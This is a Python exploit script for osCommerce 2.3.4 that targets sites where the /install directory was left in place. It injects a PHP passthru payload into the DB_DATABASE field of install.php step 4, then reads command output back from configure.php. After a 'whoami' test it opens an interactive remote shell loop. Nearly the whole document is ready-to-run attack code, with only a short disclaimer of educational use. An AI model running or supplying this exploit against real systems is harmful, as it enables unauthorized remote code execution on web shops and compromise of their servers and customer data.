"""
Exploit Title: osCommerce 2.3.4 - Remote Command Execution (RCE)
Vulnerability: Remote Command Execution when /install directory wasn't removed by the admin
Exploit: Exploiting the install.php finish process by injecting PHP payload into the db_database parameter & read the system command output from configure.php
Date: 26/06/2021
Exploit Author: Bryan Leong <NobodyAtall>
Modified by: Hackhoven
Vendor Homepage: https://www.oscommerce.com/
Version: osCommerce 2.3.4
Tested on: Windows

Disclaimer: This script is for educational purposes only. Use it at your own risk. 
The author is not responsible for any damage caused by this script. 
Ensure you have permission before using it on any system.

GitHub Repository: https://github.com/Hackhoven/osCommerce-2.3.4-RCE
"""

import requests
import sys

def print_usage():
    """Prints the usage instructions for the script."""
    print("Usage: python3 osCommerce2_3_4_RCE.py <url>")
    print("Example: python3 osCommerce2_3_4_RCE.py http://localhost/oscommerce-2.3.4/catalog")
    sys.exit(0)

# Check if the correct number of arguments is provided
if len(sys.argv) != 2:
    print("Error: Please specify the osCommerce URL")
    print_usage()

base_url = sys.argv[1].rstrip('/')
test_vuln_url = f"{base_url}/install/install.php"

def rce(command):
    """Executes the remote command on the vulnerable osCommerce server."""
    target_url = f"{base_url}/install/install.php?step=4"
    payload = f"'); passthru('{command}'); /*"

    # Data to be sent in the POST request
    data = {
        'DIR_FS_DOCUMENT_ROOT': './',
        'DB_DATABASE': payload
    }

    # Sending the payload to the target URL
    response = requests.post(target_url, data=data)

    if response.status_code == 200:
        read_cmd_url = f"{base_url}/install/includes/configure.php"
        cmd_response = requests.get(read_cmd_url)

        if cmd_response.status_code == 200:
            command_output = cmd_response.text.split('\n')
            output_lines = command_output[2:]
            if output_lines:
                for line in output_lines:
                    print(line)
            else:
                return '[!] Error: No output returned. The command may be invalid or produced no output.'
        else:
            return '[!] Error: configure.php not found'
    else:
        return '[!] Error: Failed to inject payload'

# Testing if the install directory is accessible, which indicates a potential vulnerability
test_response = requests.get(test_vuln_url)

if test_response.status_code == 200:
    print('[*] Install directory is accessible, the host is likely vulnerable.')

    print('[*] Testing system command injection...')
    initial_cmd = 'whoami'

    print('User: ', end='')
    error_message = rce(initial_cmd)

    if error_message:
        print(error_message)
        sys.exit(0)

    # Interactive shell for executing further commands
    while True:
        try:
            cmd = input('$ ')
            if cmd.lower() in ('exit', 'quit'):
                print('[*] Exiting...')
                break
            error_message = rce(cmd)
            if error_message:
                print(error_message)
                sys.exit(0)
        except KeyboardInterrupt:
            print('\n[*] Exiting...')
            break
else:
    print('[!] Install directory not found, the host is not vulnerable.')
    sys.exit(0)
